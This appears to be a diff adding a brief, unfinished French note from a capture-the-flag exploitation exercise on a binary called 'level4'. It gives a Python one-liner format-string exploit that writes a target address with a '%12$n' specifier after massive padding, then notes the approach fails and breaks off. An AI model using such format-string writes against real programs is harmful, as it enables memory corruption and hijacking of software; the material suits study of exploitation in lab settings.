@@ -1,0 +1,6 @@
+meme chose que level 3 sauf que le debut de la format string a la 2 eme position sur la stack et m est comparer a un tres grand nombre:
+
+(python -c 'print("\x10\x98\x04\x08" + "a" * 16930112 + "%12$n")'; cat -) | ./level4
+
+ca n marche as le terminal ne supporte pas autant de caractere donc
+
